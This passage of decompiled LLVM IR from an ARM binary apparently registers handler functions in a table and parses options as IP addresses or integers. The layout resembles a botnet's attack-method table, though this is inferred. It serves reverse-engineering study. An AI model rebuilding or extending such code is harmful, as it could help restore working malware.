  br i1 %v2_9220, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_921c
  store i32 %v4_9080, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_921c, %bb
  store i32 37420, i32* %lr.global-to-local, align 4
  %v1_9228 = xor i1 %v2_9220, true
  call void @__pseudo_cond_branch(i1 %v1_9228, i32 ptrtoint (i32* @global_var_8d88.79 to i32))
  %v2_9230 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_9230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9230, label %.dec_label_pc_9040_crit_edge, label %dec_label_pc_9238

.dec_label_pc_9040_crit_edge:                     ; preds = %bb31
  %v29_9044.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9040

dec_label_pc_9238:                                ; preds = %bb31
  %v0_9238 = load i32, i32* @sb, align 4
  %v2_9238 = icmp eq i32 %v0_9238, 0
  store i1 %v2_9238, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_9238, 1
  br i1 %tmp32, label %dec_label_pc_9260, label %dec_label_pc_9240

dec_label_pc_9240:                                ; preds = %dec_label_pc_9238
  br label %dec_label_pc_9244

dec_label_pc_9244:                                ; preds = %dec_label_pc_9244, %dec_label_pc_9240
  %v0_9250 = phi i32 [ %v1_9250, %dec_label_pc_9244 ], [ 0, %dec_label_pc_9240 ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_9248 = mul i32 %v0_9250, 8
  %v5_9248 = add i32 %v4_9248, %stack_var_-52.3
  %v6_9248 = inttoptr i32 %v5_9248 to i32*
  %v7_9248 = load i32, i32* %v6_9248, align 4
  store i32 %v7_9248, i32* %r0.global-to-local, align 4
  %v2_924c = icmp eq i32 %v7_9248, 0
  store i1 %v2_924c, i1* %cpsr_z.global-to-local, align 1
  %v1_9250 = add i32 %v0_9250, 1
  store i32 37464, i32* %lr.global-to-local, align 4
  %v1_9254 = xor i1 %v2_924c, true
  call void @__pseudo_cond_branch(i1 %v1_9254, i32 ptrtoint (i32* @global_var_8d88.79 to i32))
  %v0_9258 = load i32, i32* @sb, align 4
  %v9_9258 = icmp eq i32 %v0_9258, %v1_9250
  store i1 %v9_9258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9258, label %dec_label_pc_9260, label %dec_label_pc_9244

dec_label_pc_9260:                                ; preds = %dec_label_pc_9244, %dec_label_pc_9238
  store i32 %stack_var_-52.3, i32* %r0.global-to-local, align 4
  store i32 %v9_901c, i32* @r6, align 4
  store i32 %v12_901c, i32* @r7, align 4
  store i32 %v18_901c, i32* @sb, align 4
  store i32 %v21_901c, i32* @sl, align 4
  store i32 %v27_901c, i32* %lr.global-to-local, align 4
  %v1_926c = inttoptr i32 %stack_var_-52.3 to i32*
  call void @free(i32* %v1_926c)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i1 %v2_9220, { 0, 2, 1 }
  uselistorder i32 %stack_var_-52.3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_91d8, { 2, 0, 1 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_91c4, { 1, 0 }
  uselistorder i32 %v3_91a8, { 0, 2, 1 }
  uselistorder i32 %v2_9180, { 2, 1, 0 }
  uselistorder i32 %v2_9198, { 1, 0 }
  uselistorder i32 %v4_9194, { 0, 2, 1, 3 }
  uselistorder i32 %v1_9188, { 2, 0, 1, 3 }
  uselistorder i32 %v0_9184, { 1, 0 }
  uselistorder i32 %v0_9120, { 0, 2, 1 }
  uselistorder i32 %v0_9110, { 0, 2, 1, 3 }
  uselistorder i32 %v4_910c, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_90f0, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_90cc, { 1, 0 }
  uselistorder i32 %v0_90b0, { 0, 2, 1 }
  uselistorder i32 %v0_908c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_9080, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 %v2_906c, { 2, 1, 0 }
  uselistorder i32 %v4_9058, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_904c, { 1, 0, 2 }
  uselistorder i32 %v0_902c, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 22, 5, 23, 6, 9, 13, 10, 7, 8, 11, 12, 19, 14, 16, 15, 17, 18, 21, 20, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32 %arg2, { 1, 5, 4, 0, 2, 3, 6 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_921c, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_9040, { 1, 0, 3, 4, 2, 5 }
}

define i32 @function_9270(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_9270:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_9270 = urem i32 %arg1, 256
  %v2_9274 = icmp eq i32 %v1_9270, 0
  br i1 %v2_9274, label %dec_label_pc_92c0, label %dec_label_pc_9284

dec_label_pc_9284:                                ; preds = %dec_label_pc_9270
  %v0_9284 = load i32, i32* %r1.global-to-local, align 4
  %v1_9284 = add i32 %v0_9284, 4
  %v2_9284 = inttoptr i32 %v1_9284 to i8*
  %v3_9284 = load i8, i8* %v2_9284, align 1
  %v4_9284 = zext i8 %v3_9284 to i32
  %v1_9288 = urem i32 %arg3, 256
  %v9_928c = icmp eq i32 %v4_9284, %v1_9288
  br i1 %v9_928c, label %dec_label_pc_92c8, label %dec_label_pc_92b0.preheader

dec_label_pc_92b0.preheader:                      ; preds = %dec_label_pc_9284
  br label %dec_label_pc_92b0

dec_label_pc_92a0:                                ; preds = %dec_label_pc_92b0
  %v1_92a0 = add i32 %v0_92a8.in, 12
  %v2_92a0 = inttoptr i32 %v1_92a0 to i8*
  %v3_92a0 = load i8, i8* %v2_92a0, align 1
  %v4_92a0 = zext i8 %v3_92a0 to i32
  %v9_92a4 = icmp eq i32 %v1_9288, %v4_92a0
  br i1 %v9_92a4, label %dec_label_pc_92c8, label %dec_label_pc_92b0

dec_label_pc_92b0:                                ; preds = %dec_label_pc_92b0.preheader, %dec_label_pc_92a0
  %v0_92a8.in = phi i32 [ %v0_9284, %dec_label_pc_92b0.preheader ], [ %v0_92a8, %dec_label_pc_92a0 ]
  %v0_92b0 = phi i32 [ 0, %dec_label_pc_92b0.preheader ], [ %v1_92b0, %dec_label_pc_92a0 ]
  %v0_92a8 = add i32 %v0_92a8.in, 8
  %v1_92b0 = add i32 %v0_92b0, 1
  %v9_92b4 = icmp eq i32 %v1_9270, %v1_92b0
  store i32 %v0_92a8, i32* %r1.global-to-local, align 4
  br i1 %v9_92b4, label %dec_label_pc_92c0, label %dec_label_pc_92a0

dec_label_pc_92c0:                                ; preds = %dec_label_pc_92b0, %dec_label_pc_92c8, %dec_label_pc_9270
  ret i32 %arg4

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a0, %dec_label_pc_9284
  %v0_92c8 = phi i32 [ %v0_9284, %dec_label_pc_9284 ], [ %v0_92a8, %dec_label_pc_92a0 ]
  %v1_92c8 = inttoptr i32 %v0_92c8 to i32*
  %v2_92c8 = load i32, i32* %v1_92c8, align 4
  %v3_92cc = icmp eq i32 %v2_92c8, 0
  br i1 %v3_92cc, label %dec_label_pc_92c0, label %dec_label_pc_92d4

dec_label_pc_92d4:                                ; preds = %dec_label_pc_92c8
  %v3_92c8 = inttoptr i32 %v2_92c8 to i8*
  %v3_92d8 = call i32 @inet_addr(i8* %v3_92c8)
  ret i32 %v3_92d8

; uselistorder directives
  uselistorder i32 %v2_92c8, { 1, 0 }
  uselistorder i32 %v1_92b0, { 1, 0 }
  uselistorder i32 %v0_92a8, { 1, 0, 2 }
  uselistorder i32 %v0_92a8.in, { 1, 0 }
  uselistorder i32 %v1_9288, { 1, 0 }
  uselistorder i32 %v0_9284, { 1, 0, 2 }
  uselistorder i32 %v1_9270, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_92c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_92b0, { 1, 0 }
}

define i32 @function_92dc(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_92dc:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_92dc = urem i32 %arg1, 256
  %v2_92e0 = icmp eq i32 %v1_92dc, 0
  %v3_92e4 = load i32, i32* @r4, align 4
  br i1 %v2_92e0, label %dec_label_pc_932c, label %dec_label_pc_92f0

dec_label_pc_92f0:                                ; preds = %dec_label_pc_92dc
  %v0_92f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_92f0 = add i32 %v0_92f0, 4
  %v2_92f0 = inttoptr i32 %v1_92f0 to i8*
  %v3_92f0 = load i8, i8* %v2_92f0, align 1
  %v4_92f0 = zext i8 %v3_92f0 to i32
  %v1_92f4 = urem i32 %arg3, 256
  %v9_92f8 = icmp eq i32 %v4_92f0, %v1_92f4
  br i1 %v9_92f8, label %dec_label_pc_9334, label %dec_label_pc_931c.preheader

dec_label_pc_931c.preheader:                      ; preds = %dec_label_pc_92f0
  br label %dec_label_pc_931c

dec_label_pc_930c:                                ; preds = %dec_label_pc_931c
  %v1_930c = add i32 %v0_9314.in, 12
  %v2_930c = inttoptr i32 %v1_930c to i8*
  %v3_930c = load i8, i8* %v2_930c, align 1
  %v4_930c = zext i8 %v3_930c to i32
  %v9_9310 = icmp eq i32 %v1_92f4, %v4_930c
  br i1 %v9_9310, label %dec_label_pc_9334, label %dec_label_pc_931c

dec_label_pc_931c:                                ; preds = %dec_label_pc_931c.preheader, %dec_label_pc_930c
  %v0_9314.in = phi i32 [ %v0_92f0, %dec_label_pc_931c.preheader ], [ %v0_9314, %dec_label_pc_930c ]
  %v0_931c = phi i32 [ 0, %dec_label_pc_931c.preheader ], [ %v1_931c, %dec_label_pc_930c ]
  %v0_9314 = add i32 %v0_9314.in, 8
  %v1_931c = add i32 %v0_931c, 1
  store i32 %v1_931c, i32* @lr, align 4
  %v9_9320 = icmp eq i32 %v1_92dc, %v1_931c
  store i32 %v0_9314, i32* %r1.global-to-local, align 4
  br i1 %v9_9320, label %dec_label_pc_932c, label %dec_label_pc_930c

dec_label_pc_932c:                                ; preds = %dec_label_pc_931c, %dec_label_pc_9334, %dec_label_pc_92dc
  store i32 %v3_92e4, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_9334:                                ; preds = %dec_label_pc_930c, %dec_label_pc_92f0
  %v0_9334 = phi i32 [ %v0_92f0, %dec_label_pc_92f0 ], [ %v0_9314, %dec_label_pc_930c ]
  %v1_9334 = inttoptr i32 %v0_9334 to i32*
  %v2_9334 = load i32, i32* %v1_9334, align 4
  %v2_9338 = icmp eq i32 %v2_9334, 0
  br i1 %v2_9338, label %dec_label_pc_932c, label %dec_label_pc_9340

dec_label_pc_9340:                                ; preds = %dec_label_pc_9334
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_92e4, i32* @r4, align 4
  %v2_9348 = inttoptr i32 %v2_9334 to i8*
  %v3_9348 = call i32 @function_118c4(i8* %v2_9348, i32 10)
  ret i32 %v3_9348

; uselistorder directives
  uselistorder i32 %v1_931c, { 1, 2, 0 }
  uselistorder i32 %v0_9314, { 1, 0, 2 }
  uselistorder i32 %v0_9314.in, { 1, 0 }
  uselistorder i32 %v1_92f4, { 1, 0 }
  uselistorder i32 %v0_92f0, { 1, 0, 2 }
  uselistorder i32 %v3_92e4, { 1, 0 }
  uselistorder i32 %v1_92dc, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_932c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_931c, { 1, 0 }
}

define i32 @function_934c(i32 %arg1) local_unnamed_addr {
dec_label_pc_934c:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_934c = load i32, i32* @r4, align 4
  store i32 %v3_934c, i32* %stack_var_-24, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_9358 = call i32* @calloc(i32 1, i32 8)
  %v3_9358 = ptrtoint i32* %v2_9358 to i32
  store i32 ptrtoint (i8** @global_var_1a3c4.75 to i32), i32* %r4.global-to-local, align 4
  %v2_9360 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9360 = zext i8 %v2_9360 to i32
  store i32 ptrtoint (i32* @global_var_1a3c8.77 to i32), i32* %r6.global-to-local, align 4
  store i32 40100, i32* %r2.global-to-local, align 4
  store i32 %v3_9358, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9374 = mul nuw nsw i32 %v3_9360, 4
  store i32 %v3_9374, i32* %r1.global-to-local, align 4
  %v2_9378 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 40100, i32* %v2_9358, align 4
  %v0_9380 = load i32, i32* %r3.global-to-local, align 4
  %v1_9380 = trunc i32 %v0_9380 to i8
  %v2_9380 = load i32, i32* %r5.global-to-local, align 4
  %v3_9380 = add i32 %v2_9380, 4
  %v4_9380 = inttoptr i32 %v3_9380 to i8*
  store i8 %v1_9380, i8* %v4_9380, align 1
  %v0_9384 = load i32, i32* %r1.global-to-local, align 4
  %v1_9384 = add i32 %v0_9384, 4
  store i32 %v1_9384, i32* %r1.global-to-local, align 4
  %v4_9388 = inttoptr i32 %v2_9378 to i32*
  %v5_9388 = call i32* @realloc(i32* %v4_9388, i32 %v1_9384)
  %v7_9388 = ptrtoint i32* %v5_9388 to i32
  %v2_938c = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_938c = zext i8 %v2_938c to i32
  store i32 %v3_938c, i32* %r3.global-to-local, align 4
  store i32 %v7_9388, i32* %ip.global-to-local, align 4
  %v0_9394 = load i32, i32* %r5.global-to-local, align 4
  %v5_9394 = mul nuw nsw i32 %v3_938c, 4
  %v6_9394 = add i32 %v5_9394, %v7_9388
  %v7_9394 = inttoptr i32 %v6_9394 to i32*
  store i32 %v0_9394, i32* %v7_9394, align 4
  store i32 ptrtoint (i8* @global_var_1a3c5.83 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_93a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_93a4 = inttoptr i32 %v2_93a4 to i8*
  store i8 ptrtoint (i8* @global_var_1a3c5.83 to i8), i8* %v3_93a4, align 1
  %v0_93a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_93a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_93a8 = inttoptr i32 %v1_93a8 to i32*
  store i32 %v0_93a8, i32* %v2_93a8, align 4
  %v2_93ac = call i32* @calloc(i32 1, i32 8)
  %v3_93ac = ptrtoint i32* %v2_93ac to i32
  %v2_93b0 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_93b0 = zext i8 %v2_93b0 to i32
  store i32 ptrtoint (i32* @global_var_b1c8.85 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  store i32 %v3_93ac, i32* %r5.global-to-local, align 4
  %v3_93c0 = mul nuw nsw i32 %v3_93b0, 4
  store i32 %v3_93c0, i32* %r1.global-to-local, align 4
  %v2_93c4 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_b1c8.85 to i32), i32* %v2_93ac, align 4
  %v2_93cc = load i32, i32* %r5.global-to-local, align 4
  %v3_93cc = add i32 %v2_93cc, 4
  %v4_93cc = inttoptr i32 %v3_93cc to i8*
  store i8 1, i8* %v4_93cc, align 1
  %v0_93d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_93d0 = add i32 %v0_93d0, 4
  store i32 %v1_93d0, i32* %r1.global-to-local, align 4
  %v3_93d4 = inttoptr i32 %v2_93c4 to i32*
  %v4_93d4 = call i32* @realloc(i32* %v3_93d4, i32 %v1_93d0)
  %v6_93d4 = ptrtoint i32* %v4_93d4 to i32
  %v2_93d8 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_93d8 = zext i8 %v2_93d8 to i32
  store i32 %v3_93d8, i32* %r3.global-to-local, align 4
  store i32 %v6_93d4, i32* %ip.global-to-local, align 4
  %v0_93e0 = load i32, i32* %r5.global-to-local, align 4
  %v5_93e0 = mul nuw nsw i32 %v3_93d8, 4
  %v6_93e0 = add i32 %v5_93e0, %v6_93d4
  %v7_93e0 = inttoptr i32 %v6_93e0 to i32*
  store i32 %v0_93e0, i32* %v7_93e0, align 4
  %v0_93e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_93e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_93e4 = add i32 %v1_93e4, %v0_93e4
  store i32 %v2_93e4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_93f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_93f0 = load i32, i32* %r6.global-to-local, align 4
  %v2_93f0 = inttoptr i32 %v1_93f0 to i32*
  store i32 %v0_93f0, i32* %v2_93f0, align 4
  %v0_93f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_93f4 = trunc i32 %v0_93f4 to i8
  %v2_93f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_93f4 = inttoptr i32 %v2_93f4 to i8*
  store i8 %v1_93f4, i8* %v3_93f4, align 1
  %v2_93f8 = call i32* @calloc(i32 %v1_93e4, i32 8)
  %v4_93f8 = ptrtoint i32* %v2_93f8 to i32
  %v2_93fc = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_93fc = zext i8 %v2_93fc to i32
  store i32 ptrtoint (i32* @global_var_b68c.87 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_93f8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_940c = mul nuw nsw i32 %v3_93fc, 4
  store i32 %v3_940c, i32* %r1.global-to-local, align 4
  %v2_9410 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_b68c.87 to i32), i32* %v2_93f8, align 4
  %v0_9418 = load i32, i32* %r3.global-to-local, align 4
  %v1_9418 = trunc i32 %v0_9418 to i8
  %v2_9418 = load i32, i32* %r5.global-to-local, align 4
  %v3_9418 = add i32 %v2_9418, 4
  %v4_9418 = inttoptr i32 %v3_9418 to i8*
  store i8 %v1_9418, i8* %v4_9418, align 1
  %v0_941c = load i32, i32* %r1.global-to-local, align 4
  %v1_941c = add i32 %v0_941c, 4
  store i32 %v1_941c, i32* %r1.global-to-local, align 4
  %v4_9420 = inttoptr i32 %v2_9410 to i32*
  %v5_9420 = call i32* @realloc(i32* %v4_9420, i32 %v1_941c)
  %v7_9420 = ptrtoint i32* %v5_9420 to i32
  %v2_9424 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9424 = zext i8 %v2_9424 to i32
  store i32 %v3_9424, i32* %r3.global-to-local, align 4
  store i32 %v7_9420, i32* %ip.global-to-local, align 4
  %v1_942c = load i32, i32* %r8.global-to-local, align 4
  %v2_942c = add i32 %v1_942c, %v3_9424
  store i32 %v2_942c, i32* %r2.global-to-local, align 4
  %v0_9430 = load i32, i32* %r5.global-to-local, align 4
  %v5_9430 = mul nuw nsw i32 %v3_9424, 4
  %v6_9430 = add i32 %v5_9430, %v7_9420
  %v7_9430 = inttoptr i32 %v6_9430 to i32*
  store i32 %v0_9430, i32* %v7_9430, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_9438 = load i32, i32* %r8.global-to-local, align 4
  %v0_943c = load i32, i32* %r2.global-to-local, align 4
  %v1_943c = trunc i32 %v0_943c to i8
  %v2_943c = load i32, i32* %r4.global-to-local, align 4
  %v3_943c = inttoptr i32 %v2_943c to i8*
  store i8 %v1_943c, i8* %v3_943c, align 1
  %v0_9440 = load i32, i32* %ip.global-to-local, align 4
  %v1_9440 = load i32, i32* %r6.global-to-local, align 4
  %v2_9440 = inttoptr i32 %v1_9440 to i32*
  store i32 %v0_9440, i32* %v2_9440, align 4
  %v2_9444 = call i32* @calloc(i32 %v0_9438, i32 8)
  %v3_9444 = ptrtoint i32* %v2_9444 to i32
  %v2_9448 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9448 = zext i8 %v2_9448 to i32
  store i32 ptrtoint (i32* @global_var_96d4.89 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* %r7.global-to-local, align 4
  store i32 %v3_9444, i32* %r5.global-to-local, align 4
  %v3_9458 = mul nuw nsw i32 %v3_9448, 4
  store i32 %v3_9458, i32* %r1.global-to-local, align 4
  %v2_945c = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_96d4.89 to i32), i32* %v2_9444, align 4
  %v2_9464 = load i32, i32* %r5.global-to-local, align 4
  %v3_9464 = add i32 %v2_9464, 4
  %v4_9464 = inttoptr i32 %v3_9464 to i8*
  store i8 8, i8* %v4_9464, align 1
  %v0_9468 = load i32, i32* %r1.global-to-local, align 4
  %v1_9468 = add i32 %v0_9468, 4
  store i32 %v1_9468, i32* %r1.global-to-local, align 4
  %v3_946c = inttoptr i32 %v2_945c to i32*
  %v4_946c = call i32* @realloc(i32* %v3_946c, i32 %v1_9468)
  %v6_946c = ptrtoint i32* %v4_946c to i32
  %v2_9470 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9470 = zext i8 %v2_9470 to i32
  store i32 %v3_9470, i32* %r3.global-to-local, align 4
  store i32 %v6_946c, i32* %ip.global-to-local, align 4
  %v0_9478 = load i32, i32* %r5.global-to-local, align 4
  %v5_9478 = mul nuw nsw i32 %v3_9470, 4
  %v6_9478 = add i32 %v5_9478, %v6_946c
  %v7_9478 = inttoptr i32 %v6_9478 to i32*
  store i32 %v0_9478, i32* %v7_9478, align 4
  %v0_947c = load i32, i32* %r3.global-to-local, align 4
  %v1_947c = load i32, i32* %r8.global-to-local, align 4
  %v2_947c = add i32 %v1_947c, %v0_947c
  store i32 %v2_947c, i32* %r2.global-to-local, align 4
  %v0_9480 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9480, i32* %r1.global-to-local, align 4
  %v0_9488 = load i32, i32* %ip.global-to-local, align 4
  %v1_9488 = load i32, i32* %r6.global-to-local, align 4
  %v2_9488 = inttoptr i32 %v1_9488 to i32*
  store i32 %v0_9488, i32* %v2_9488, align 4
  %v0_948c = load i32, i32* %r2.global-to-local, align 4
  %v1_948c = trunc i32 %v0_948c to i8
  %v2_948c = load i32, i32* %r4.global-to-local, align 4
  %v3_948c = inttoptr i32 %v2_948c to i8*
  store i8 %v1_948c, i8* %v3_948c, align 1
  %v2_9490 = call i32* @calloc(i32 %v1_947c, i32 %v0_9480)
  %v4_9490 = ptrtoint i32* %v2_9490 to i32
  %v2_9494 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9494 = zext i8 %v2_9494 to i32
  store i32 ptrtoint (i32* @global_var_d6a8.91 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_9490, i32* %r5.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_94a4 = mul nuw nsw i32 %v3_9494, 4
  store i32 %v3_94a4, i32* %r1.global-to-local, align 4
  %v2_94a8 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_d6a8.91 to i32), i32* %v2_9490, align 4
  %v0_94b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_94b0 = trunc i32 %v0_94b0 to i8
  %v2_94b0 = load i32, i32* %r5.global-to-local, align 4
  %v3_94b0 = add i32 %v2_94b0, 4
  %v4_94b0 = inttoptr i32 %v3_94b0 to i8*
  store i8 %v1_94b0, i8* %v4_94b0, align 1
  %v0_94b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_94b4 = add i32 %v0_94b4, 4
  store i32 %v1_94b4, i32* %r1.global-to-local, align 4
  %v4_94b8 = inttoptr i32 %v2_94a8 to i32*
  %v5_94b8 = call i32* @realloc(i32* %v4_94b8, i32 %v1_94b4)
  %v7_94b8 = ptrtoint i32* %v5_94b8 to i32
  %v2_94bc = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_94bc = zext i8 %v2_94bc to i32
  store i32 %v3_94bc, i32* %r3.global-to-local, align 4
  store i32 %v7_94b8, i32* %ip.global-to-local, align 4
  %v0_94c4 = load i32, i32* %r5.global-to-local, align 4
  %v5_94c4 = mul nuw nsw i32 %v3_94bc, 4
  %v6_94c4 = add i32 %v5_94c4, %v7_94b8
  %v7_94c4 = inttoptr i32 %v6_94c4 to i32*
  store i32 %v0_94c4, i32* %v7_94c4, align 4
  %v0_94c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_94c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_94c8 = add i32 %v1_94c8, %v0_94c8
  store i32 %v2_94c8, i32* %r2.global-to-local, align 4
  %v0_94cc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_94cc, i32* %r1.global-to-local, align 4
  %v0_94d4 = load i32, i32* %ip.global-to-local, align 4
  %v1_94d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_94d4 = inttoptr i32 %v1_94d4 to i32*
  store i32 %v0_94d4, i32* %v2_94d4, align 4
  %v0_94d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_94d8 = trunc i32 %v0_94d8 to i8
  %v2_94d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_94d8 = inttoptr i32 %v2_94d8 to i8*
  store i8 %v1_94d8, i8* %v3_94d8, align 1
  %v2_94dc = call i32* @calloc(i32 %v1_94c8, i32 %v0_94cc)
  %v4_94dc = ptrtoint i32* %v2_94dc to i32
  %v2_94e0 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_94e0 = zext i8 %v2_94e0 to i32
  store i32 ptrtoint (i32* @global_var_cf34.93 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_94dc, i32* %r5.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_94f0 = mul nuw nsw i32 %v3_94e0, 4
  store i32 %v3_94f0, i32* %r1.global-to-local, align 4
  %v2_94f4 = load i32, i32* @global_var_1a3c8.77, align 4
  store i32 ptrtoint (i32* @global_var_cf34.93 to i32), i32* %v2_94dc, align 4
  %v0_94fc = load i32, i32* %r3.global-to-local, align 4
  %v1_94fc = trunc i32 %v0_94fc to i8
  %v2_94fc = load i32, i32* %r5.global-to-local, align 4
  %v3_94fc = add i32 %v2_94fc, 4
  %v4_94fc = inttoptr i32 %v3_94fc to i8*
  store i8 %v1_94fc, i8* %v4_94fc, align 1
  %v0_9500 = load i32, i32* %r1.global-to-local, align 4
  %v1_9500 = add i32 %v0_9500, 4
  store i32 %v1_9500, i32* %r1.global-to-local, align 4
  %v4_9504 = inttoptr i32 %v2_94f4 to i32*
  %v5_9504 = call i32* @realloc(i32* %v4_9504, i32 %v1_9500)
  %v7_9504 = ptrtoint i32* %v5_9504 to i32
  %v2_9508 = load i8, i8* bitcast (i8** @global_var_1a3c4.75 to i8*), align 4
  %v3_9508 = zext i8 %v2_9508 to i32
  store i32 %v3_9508, i32* %r3.global-to-local, align 4
  store i32 %v7_9504, i32* %ip.global-to-local, align 4
  %v0_9510 = load i32, i32* %r5.global-to-local, align 4
  %v5_9510 = mul nuw nsw i32 %v3_9508, 4
  %v6_9510 = add i32 %v5_9510, %v7_9504
  %v7_9510 = inttoptr i32 %v6_9510 to i32*
  store i32 %v0_9510, i32* %v7_9510, align 4
  %v0_9514 = load i32, i32* %r3.global-to-local, align 4
  %v1_9514 = load i32, i32* %r8.global-to-local, align 4
  %v2_9514 = add i32 %v1_9514, %v0_9514
  store i32 %v2_9514, i32* %r2.global-to-local, align 4
  %v0_9518 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_9518, i32* %r1.global-to-local, align 4
  %v0_9520 = load i32, i32* %ip.global-to-local, align 4
  %v1_9520 = load i32, i32* %r6.global-to-local, align 4
  %v2_9520 = inttoptr i32 %v1_9520 to i32*
  store i32 %v0_9520, i32* %v2_9520, align 4
